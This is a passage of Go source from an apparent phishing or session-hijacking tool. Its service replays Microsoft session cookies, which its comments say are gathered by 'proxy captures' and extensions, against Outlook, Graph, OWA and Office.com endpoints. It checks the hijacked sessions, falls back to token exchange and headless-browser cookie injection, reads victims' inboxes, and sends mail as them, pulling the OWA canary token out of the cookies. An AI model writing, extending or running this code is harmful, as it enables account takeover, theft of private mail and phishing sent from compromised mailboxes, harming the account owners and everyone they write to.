	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("Graph API folders failed (HTTP %d)", resp.StatusCode)
	}

	var folderData struct {
		Value []struct {
			ID              string `json:"id"`
			DisplayName     string `json:"displayName"`
			TotalItemCount  int    `json:"totalItemCount"`
			UnreadItemCount int    `json:"unreadItemCount"`
		} `json:"value"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&folderData); err != nil {
		return nil, err
	}

	folders := make([]model.InboxFolder, len(folderData.Value))
	for i, f := range folderData.Value {
		folders[i] = model.InboxFolder{
			ID:              f.ID,
			DisplayName:     f.DisplayName,
			TotalItemCount:  f.TotalItemCount,
			UnreadItemCount: f.UnreadItemCount,
		}
	}

	return folders, nil
}

// --- Internal helpers ---

// buildCookieHeader builds a Cookie header string from stored cookies JSON,
// filtering to only Outlook/Microsoft domains.
// Uses generic map parsing to handle cookies from different sources
// (proxy captures use string booleans, extensions use real booleans).
func (s *CookieStoreService) buildCookieHeader(cookiesJSON string) string {
	// Use generic map parsing to handle both string and boolean fields
	var rawCookies []map[string]interface{}
	if err := json.Unmarshal([]byte(cookiesJSON), &rawCookies); err != nil {
		s.Logger.Errorw("failed to parse cookies JSON", "error", err)
		return ""
	}

	var parts []string
	for _, c := range rawCookies {
		name, _ := c["name"].(string)
		value, _ := c["value"].(string)
		domain, _ := c["domain"].(string)

		if name == "" || value == "" || domain == "" {
			continue
		}

		if !strings.HasPrefix(domain, ".") {
			domain = "." + domain
		}
		isOutlook := false
		for _, od := range outlookDomains {
			if strings.HasSuffix(domain, od) || domain == od {
				isOutlook = true
				break
			}
		}
		if isOutlook {
			parts = append(parts, fmt.Sprintf("%s=%s", name, value))
		}
	}

	return strings.Join(parts, "; ")
}

// buildAllCookieHeader builds a Cookie header string from ALL stored cookies
// (no domain filtering). Used for validation endpoints that may need
// cookies from various Microsoft domains.
func (s *CookieStoreService) buildAllCookieHeader(cookiesJSON string) string {
	var rawCookies []map[string]interface{}
	if err := json.Unmarshal([]byte(cookiesJSON), &rawCookies); err != nil {
		s.Logger.Errorw("failed to parse cookies JSON", "error", err)
		return ""
	}

	var parts []string
	for _, c := range rawCookies {
		name, _ := c["name"].(string)
		value, _ := c["value"].(string)
		if name == "" || value == "" {
			continue
		}
		parts = append(parts, fmt.Sprintf("%s=%s", name, value))
	}

	return strings.Join(parts, "; ")
}

// validateAndUpdate validates a cookie session and updates the database record.
// It tries token exchange first (MSRT refresh token -> Graph API), then browser
// automation, then falls back to cookie-based validation against multiple endpoints.
func (s *CookieStoreService) validateAndUpdate(ctx context.Context, id uuid.UUID) error {
	store, err := s.CookieStoreRepo.GetByID(ctx, id)
	if err != nil {
		return err
	}

	// Attempt 1: Token exchange (MSRT -> access token -> Graph API /me)
	email, displayName, valid := s.validateViaTokenExchange(ctx, store)
	if valid {
		now := time.Now()
		updates := map[string]interface{}{
			"is_valid":          true,
			"last_checked":      now,
			"validation_method": "token_exchange",
		}
		if email != "" {
			updates["email"] = email
		}
		if displayName != "" {
			updates["display_name"] = displayName
		}
		return s.CookieStoreRepo.Update(ctx, id, updates)
	}

	// Attempt 2: Browser automation (headless Chrome with cookie injection)
	browserEmail, browserDisplayName, browserToken, browserValid := s.validateViaBrowser(ctx, store)
	if browserValid {
		now := time.Now()
		updates := map[string]interface{}{
			"is_valid":          true,
			"last_checked":      now,
			"validation_method": "browser",
		}
		if browserEmail != "" {
			updates["email"] = browserEmail
		}
		if browserDisplayName != "" {
			updates["display_name"] = browserDisplayName
		}
		if browserToken != "" {
			updates["access_token"] = browserToken
			expiry := time.Now().Add(55 * time.Minute)
			updates["token_expiry"] = expiry
		}
		return s.CookieStoreRepo.Update(ctx, id, updates)
	}

	// Attempt 3: Cookie-based validation against multiple endpoints
	allCookieHeader := s.buildAllCookieHeader(store.CookiesJSON)
	if allCookieHeader == "" {
		now := time.Now()
		return s.CookieStoreRepo.Update(ctx, id, map[string]interface{}{
			"is_valid":     false,
			"last_checked": now,
		})
	}

	email, displayName, valid = s.validateSession(ctx, allCookieHeader)

	now := time.Now()
	updates := map[string]interface{}{
		"is_valid":     valid,
		"last_checked": now,
	}
	if valid {
		updates["validation_method"] = "cookie"
	}
	if email != "" {
		updates["email"] = email
	}
	if displayName != "" {
		updates["display_name"] = displayName
	}

	return s.CookieStoreRepo.Update(ctx, id, updates)
}

// validateSession checks if a cookie session is valid against multiple Microsoft APIs
func (s *CookieStoreService) validateSession(ctx context.Context, cookieHeader string) (email, displayName string, valid bool) {
	client := &http.Client{Timeout: 15 * time.Second}

	// Attempt 1: Outlook REST API /me endpoint
	s.Logger.Debugw("cookie validation: trying Outlook REST API")
	httpReq, err := http.NewRequestWithContext(ctx, "GET", "https://outlook.office365.com/api/v2.0/me", nil)
	if err == nil {
		httpReq.Header.Set("Cookie", cookieHeader)
		httpReq.Header.Set("User-Agent", outlookUserAgent)
		httpReq.Header.Set("Accept", "application/json")

		resp, err := client.Do(httpReq)
		if err == nil {
			defer resp.Body.Close()
			s.Logger.Debugw("cookie validation: Outlook REST API response", "status", resp.StatusCode)
			if resp.StatusCode == 200 {
				var data struct {
					EmailAddress string `json:"EmailAddress"`
					DisplayName  string `json:"DisplayName"`
					ID           string `json:"Id"`
				}
				if json.NewDecoder(resp.Body).Decode(&data) == nil {
					email = data.EmailAddress
					if email == "" {
						email = data.ID
					}
					displayName = data.DisplayName
					return email, displayName, true
				}
			}
		}
	}

	// Attempt 2: Microsoft Graph API /me endpoint
	s.Logger.Debugw("cookie validation: trying Microsoft Graph API")
	httpReq2, err := http.NewRequestWithContext(ctx, "GET", "https://graph.microsoft.com/v1.0/me", nil)
	if err == nil {
		httpReq2.Header.Set("Cookie", cookieHeader)
		httpReq2.Header.Set("User-Agent", outlookUserAgent)
		httpReq2.Header.Set("Accept", "application/json")

		resp, err := client.Do(httpReq2)
		if err == nil {
			defer resp.Body.Close()
			s.Logger.Debugw("cookie validation: Graph API response", "status", resp.StatusCode)
			if resp.StatusCode == 200 {
				var data struct {
					Mail        string `json:"mail"`
					DisplayName string `json:"displayName"`
					UPN         string `json:"userPrincipalName"`
				}
				if json.NewDecoder(resp.Body).Decode(&data) == nil {
					email = data.Mail
					if email == "" {
						email = data.UPN
					}
					displayName = data.DisplayName
					if email != "" || displayName != "" {
						return email, displayName, true
					}
				}
			}
		}
	}

	// Attempt 3: OWA (Outlook Web App)
	s.Logger.Debugw("cookie validation: trying OWA")
	httpReq3, err := http.NewRequestWithContext(ctx, "GET", "https://outlook.office365.com/owa/", nil)
	if err == nil {
		httpReq3.Header.Set("Cookie", cookieHeader)
		httpReq3.Header.Set("User-Agent", outlookUserAgent)

		noRedirectClient := &http.Client{
			Timeout: 15 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
		resp, err := noRedirectClient.Do(httpReq3)
		if err == nil {
			defer resp.Body.Close()
			s.Logger.Debugw("cookie validation: OWA response", "status", resp.StatusCode)
			if resp.StatusCode == 200 {
				return "unknown (OWA session)", "", true
			}
		}
	}

	// Attempt 4: Office.com API to check if the session is alive
	s.Logger.Debugw("cookie validation: trying Office.com")
	httpReq4, err := http.NewRequestWithContext(ctx, "GET", "https://www.office.com/api/auth/me", nil)
	if err == nil {
		httpReq4.Header.Set("Cookie", cookieHeader)
		httpReq4.Header.Set("User-Agent", outlookUserAgent)
		httpReq4.Header.Set("Accept", "application/json")

		resp, err := client.Do(httpReq4)
		if err == nil {
			defer resp.Body.Close()
			s.Logger.Debugw("cookie validation: Office.com response", "status", resp.StatusCode)
			if resp.StatusCode == 200 {
				var data struct {
					Email       string `json:"email"`
					DisplayName string `json:"displayName"`
					UPN         string `json:"upn"`
				}
				if json.NewDecoder(resp.Body).Decode(&data) == nil {
					email = data.Email
					if email == "" {
						email = data.UPN
					}
					displayName = data.DisplayName
					if email != "" || displayName != "" {
						return email, displayName, true
					}
				}
				// Even if we couldn't parse the response, a 200 means the session is alive
				return "unknown (Office session)", "", true
			}
		}
	}

	// Attempt 5: Outlook.live.com for personal Microsoft accounts
	s.Logger.Debugw("cookie validation: trying Outlook.live.com")
	httpReq5, err := http.NewRequestWithContext(ctx, "GET", "https://outlook.live.com/owa/", nil)
	if err == nil {
		httpReq5.Header.Set("Cookie", cookieHeader)
		httpReq5.Header.Set("User-Agent", outlookUserAgent)

		noRedirectClient := &http.Client{
			Timeout: 15 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
		resp, err := noRedirectClient.Do(httpReq5)
		if err == nil {
			defer resp.Body.Close()
			s.Logger.Debugw("cookie validation: Outlook.live.com response", "status", resp.StatusCode)
			if resp.StatusCode == 200 {
				return "unknown (Outlook.live session)", "", true
			}
		}
	}

	s.Logger.Warnw("cookie validation: all methods failed")
	return "", "", false
}

// buildMessagePayload builds the Outlook REST API message payload
func (s *CookieStoreService) buildMessagePayload(req *model.CookieSendRequest, fromEmail string) map[string]interface{} {
	toRecipients := make([]map[string]interface{}, len(req.To))
	for i, email := range req.To {
		toRecipients[i] = map[string]interface{}{
			"EmailAddress": map[string]string{"Address": email},
		}
	}

	contentType := "Text"
	if req.IsHTML {
		contentType = "HTML"
	}

	message := map[string]interface{}{
		"Subject": req.Subject,
		"Body": map[string]interface{}{
			"ContentType": contentType,
			"Content":     req.Body,
		},
		"ToRecipients": toRecipients,
	}

	if fromEmail != "" {
		message["From"] = map[string]interface{}{
			"EmailAddress": map[string]string{
				"Address": fromEmail,
			},
		}
	}

	if len(req.CC) > 0 {
		ccRecipients := make([]map[string]interface{}, len(req.CC))
		for i, email := range req.CC {
			ccRecipients[i] = map[string]interface{}{
				"EmailAddress": map[string]string{"Address": email},
			}
		}
		message["CcRecipients"] = ccRecipients
	}

	if len(req.BCC) > 0 {
		bccRecipients := make([]map[string]interface{}, len(req.BCC))
		for i, email := range req.BCC {
			bccRecipients[i] = map[string]interface{}{
				"EmailAddress": map[string]string{"Address": email},
			}
		}
		message["BccRecipients"] = bccRecipients
	}

	return message
}

// sendViaRestAPI sends an email via Outlook REST API v2.0
func (s *CookieStoreService) sendViaRestAPI(ctx context.Context, cookieHeader string, message map[string]interface{}, req *model.CookieSendRequest) *model.CookieSendResult {
	payload := map[string]interface{}{
		"Message":         message,
		"SaveToSentItems": req.SaveToSent,
	}

	body, _ := json.Marshal(payload)

	httpReq, err := http.NewRequestWithContext(ctx, "POST",
		"https://outlook.office365.com/api/v2.0/me/sendmail", bytes.NewReader(body))
	if err != nil {
		return &model.CookieSendResult{
			Success: false, Method: "rest_api", Error: err.Error(),
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}
	}

	httpReq.Header.Set("Cookie", cookieHeader)
	httpReq.Header.Set("Content-Type", "application/json")
	httpReq.Header.Set("User-Agent", outlookUserAgent)
	httpReq.Header.Set("Accept", "application/json")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return &model.CookieSendResult{
			Success: false, Method: "rest_api", Error: err.Error(),
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}
	}
	defer resp.Body.Close()

	if resp.StatusCode == 202 || resp.StatusCode == 200 {
		return &model.CookieSendResult{
			Success:   true,
			Method:    "rest_api",
			MessageID: fmt.Sprintf("cookie-rest-%d", time.Now().UnixMilli()),
			SentAt:    time.Now().UTC().Format(time.RFC3339),
		}
	}

	respBody, _ := io.ReadAll(resp.Body)
	return &model.CookieSendResult{
		Success: false, Method: "rest_api",
		Error:  fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(respBody)),
		SentAt: time.Now().UTC().Format(time.RFC3339),
	}
}

// sendViaOWA sends an email via OWA endpoint (fallback)
func (s *CookieStoreService) sendViaOWA(ctx context.Context, cookieHeader string, req *model.CookieSendRequest) *model.CookieSendResult {
	owaPayload := map[string]interface{}{
		"__type": "SendItemRequest:#Exchange",
		"Items": []map[string]interface{}{
			{
				"__type":  "Message:#Exchange",
				"Subject": req.Subject,
				"Body": map[string]interface{}{
					"__type":   "BodyContentType:#Exchange",
					"BodyType": "HTML",
					"Value":    req.Body,
				},
				"ToRecipients": s.buildOWARecipients(req.To),
			},
		},
	}

	body, _ := json.Marshal(owaPayload)

	httpReq, err := http.NewRequestWithContext(ctx, "POST",
		"https://outlook.office365.com/owa/service.svc?action=CreateItem&ID=-1&AC=1",
		bytes.NewReader(body))
	if err != nil {
		return &model.CookieSendResult{
			Success: false, Method: "owa", Error: err.Error(),
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}
	}

	httpReq.Header.Set("Cookie", cookieHeader)
	httpReq.Header.Set("Content-Type", "application/json; charset=utf-8")
	httpReq.Header.Set("User-Agent", outlookUserAgent)
	httpReq.Header.Set("Action", "CreateItem")

	// Extract X-OWA-CANARY from cookies
	canary := s.extractCanary(cookieHeader)
	if canary != "" {
		httpReq.Header.Set("X-OWA-CANARY", canary)
	}

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return &model.CookieSendResult{
			Success: false, Method: "owa", Error: err.Error(),
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 || resp.StatusCode == 202 {
		return &model.CookieSendResult{
			Success:   true,
			Method:    "owa",
			MessageID: fmt.Sprintf("cookie-owa-%d", time.Now().UnixMilli()),
			SentAt:    time.Now().UTC().Format(time.RFC3339),
		}
	}

	respBody, _ := io.ReadAll(resp.Body)
	return &model.CookieSendResult{
		Success: false, Method: "owa",
		Error:  fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(respBody)),
		SentAt: time.Now().UTC().Format(time.RFC3339),
	}
}

// buildOWARecipients builds OWA-format recipients
func (s *CookieStoreService) buildOWARecipients(emails []string) []map[string]interface{} {
	recipients := make([]map[string]interface{}, len(emails))
	for i, email := range emails {
		recipients[i] = map[string]interface{}{
			"__type": "SingleRecipientType:#Exchange",
			"Mailbox": map[string]interface{}{
				"__type":       "EmailAddressWrapper:#Exchange",
				"EmailAddress": email,
				"Name":         email,
			},
		}
	}
	return recipients
}

// extractCanary extracts the X-OWA-CANARY token from cookies
func (s *CookieStoreService) extractCanary(cookieHeader string) string {
	parts := strings.Split(cookieHeader, ";")
	for _, part := range parts {
		part = strings.TrimSpace(part)
		if strings.HasPrefix(strings.ToLower(part), "x-owa-canary=") {
			idx := strings.Index(part, "=")
			if idx >= 0 {
				return part[idx+1:]
			}
		}
	}
	return ""
}

// parseMessagesResponse parses the Outlook REST API messages response
func (s *CookieStoreService) parseMessagesResponse(body io.Reader) ([]model.InboxMessage, int, error) {
	var msgData struct {
		Value []struct {
			ID               string `json:"Id"`
			Subject          string `json:"Subject"`
			ReceivedDateTime string `json:"ReceivedDateTime"`
			BodyPreview      string `json:"BodyPreview"`
			ConversationID   string `json:"ConversationId"`
			IsRead           bool   `json:"IsRead"`
			HasAttachments   bool   `json:"HasAttachments"`
			From             struct {
				EmailAddress struct {
					Address string `json:"Address"`
					Name    string `json:"Name"`
				} `json:"EmailAddress"`
			} `json:"From"`
			ToRecipients []struct {
				EmailAddress struct {
					Address string `json:"Address"`
				} `json:"EmailAddress"`
			} `json:"ToRecipients"`
		} `json:"value"`
	}

	if err := json.NewDecoder(body).Decode(&msgData); err != nil {
		return nil, 0, errs.Wrap(err)
	}

	messages := make([]model.InboxMessage, len(msgData.Value))
	for i, m := range msgData.Value {
		toAddrs := make([]string, 0)
		for _, r := range m.ToRecipients {
			if r.EmailAddress.Address != "" {
				toAddrs = append(toAddrs, r.EmailAddress.Address)
			}
		}

		messages[i] = model.InboxMessage{
			ID:             m.ID,
			From:           m.From.EmailAddress.Address,
			FromName:       m.From.EmailAddress.Name,
			To:             toAddrs,
			Subject:        m.Subject,
			Preview:        m.BodyPreview,
			Date:           m.ReceivedDateTime,
			IsRead:         m.IsRead,
			HasAttachments: m.HasAttachments,
			ConversationID: m.ConversationID,
		}
	}

	return messages, len(messages), nil
}

// parseGraphMessagesResponse parses the Microsoft Graph API messages response
func (s *CookieStoreService) parseGraphMessagesResponse(body io.Reader) ([]model.InboxMessage, int, error) {
	var msgData struct {
		Value []struct {
			ID               string `json:"id"`
			Subject          string `json:"subject"`
			ReceivedDateTime string `json:"receivedDateTime"`
			BodyPreview      string `json:"bodyPreview"`
			ConversationID   string `json:"conversationId"`
			IsRead           bool   `json:"isRead"`
			HasAttachments   bool   `json:"hasAttachments"`
			From             struct {
				EmailAddress struct {
					Address string `json:"address"`
					Name    string `json:"name"`
				} `json:"emailAddress"`
			} `json:"from"`
			ToRecipients []struct {
				EmailAddress struct {
					Address string `json:"address"`
				} `json:"emailAddress"`
			} `json:"toRecipients"`
		} `json:"value"`
	}

	if err := json.NewDecoder(body).Decode(&msgData); err != nil {
		return nil, 0, errs.Wrap(err)
	}

	messages := make([]model.InboxMessage, len(msgData.Value))
	for i, m := range msgData.Value {
		toAddrs := make([]string, 0)
		for _, r := range m.ToRecipients {
			if r.EmailAddress.Address != "" {
				toAddrs = append(toAddrs, r.EmailAddress.Address)
			}
		}

		messages[i] = model.InboxMessage{
			ID:             m.ID,
			From:           m.From.EmailAddress.Address,
			FromName:       m.From.EmailAddress.Name,
			To:             toAddrs,
			Subject:        m.Subject,
			Preview:        m.BodyPreview,
			Date:           m.ReceivedDateTime,
			IsRead:         m.IsRead,
			HasAttachments: m.HasAttachments,
			ConversationID: m.ConversationID,
		}
	}

	return messages, len(messages), nil
}

// parseMessageFull parses a full message from the Outlook REST API
func (s *CookieStoreService) parseMessageFull(body io.Reader) (*model.InboxMessageFull, error) {
	var msgData struct {
		ID               string `json:"Id"`
		Subject          string `json:"Subject"`
		ReceivedDateTime string `json:"ReceivedDateTime"`
		IsRead           bool   `json:"IsRead"`
		HasAttachments   bool   `json:"HasAttachments"`
		BodyPreview      string `json:"BodyPreview"`
		Body             struct {
			ContentType string `json:"ContentType"`
			Content     string `json:"Content"`
		} `json:"Body"`
		From struct {
			EmailAddress struct {
				Address string `json:"Address"`
				Name    string `json:"Name"`
			} `json:"EmailAddress"`
		} `json:"From"`
		ToRecipients []struct {
			EmailAddress struct {
				Address string `json:"Address"`
			} `json:"EmailAddress"`
		} `json:"ToRecipients"`
	}

	if err := json.NewDecoder(body).Decode(&msgData); err != nil {
		return nil, errs.Wrap(err)
	}

	toAddrs := make([]string, 0)
	for _, r := range msgData.ToRecipients {
		if r.EmailAddress.Address != "" {
			toAddrs = append(toAddrs, r.EmailAddress.Address)
		}
	}

	bodyHTML := ""
	bodyText := ""
	if strings.EqualFold(msgData.Body.ContentType, "HTML") {
		bodyHTML = msgData.Body.Content
	} else {
		bodyText = msgData.Body.Content
	}

	return &model.InboxMessageFull{
		InboxMessage: model.InboxMessage{
			ID:             msgData.ID,
			From:           msgData.From.EmailAddress.Address,
			FromName:       msgData.From.EmailAddress.Name,
			To:             toAddrs,
			Subject:        msgData.Subject,
			Preview:        msgData.BodyPreview,
			Date:           msgData.ReceivedDateTime,
			IsRead:         msgData.IsRead,
			HasAttachments: msgData.HasAttachments,
		},
		BodyHTML: bodyHTML,
		BodyText: bodyText,
	}, nil
}

// parseGraphMessageFull parses a full message from the Microsoft Graph API
func (s *CookieStoreService) parseGraphMessageFull(body io.Reader) (*model.InboxMessageFull, error) {
	var msgData struct {
		ID               string `json:"id"`
		Subject          string `json:"subject"`
		ReceivedDateTime string `json:"receivedDateTime"`
		IsRead           bool   `json:"isRead"`
		HasAttachments   bool   `json:"hasAttachments"`
		BodyPreview      string `json:"bodyPreview"`
		Body             struct {
			ContentType string `json:"contentType"`
			Content     string `json:"content"`
		} `json:"body"`
		From struct {
			EmailAddress struct {
				Address string `json:"address"`
				Name    string `json:"name"`
			} `json:"emailAddress"`
		} `json:"from"`
		ToRecipients []struct {
			EmailAddress struct {
				Address string `json:"address"`
			} `json:"emailAddress"`
		} `json:"toRecipients"`
	}

	if err := json.NewDecoder(body).Decode(&msgData); err != nil {
		return nil, errs.Wrap(err)
	}

	toAddrs := make([]string, 0)
	for _, r := range msgData.ToRecipients {
		if r.EmailAddress.Address != "" {
			toAddrs = append(toAddrs, r.EmailAddress.Address)
		}
	}

	bodyHTML := ""
	bodyText := ""
	if strings.EqualFold(msgData.Body.ContentType, "html") {
		bodyHTML = msgData.Body.Content
	} else {
		bodyText = msgData.Body.Content
	}

	return &model.InboxMessageFull{
		InboxMessage: model.InboxMessage{
			ID:             msgData.ID,
			From:           msgData.From.EmailAddress.Address,
			FromName:       msgData.From.EmailAddress.Name,
			To:             toAddrs,
			Subject:        msgData.Subject,
			Preview:        msgData.BodyPreview,
			Date:           msgData.ReceivedDateTime,
			IsRead:         msgData.IsRead,
			HasAttachments: msgData.HasAttachments,
		},
		BodyHTML: bodyHTML,
		BodyText: bodyText,
	}, nil
}
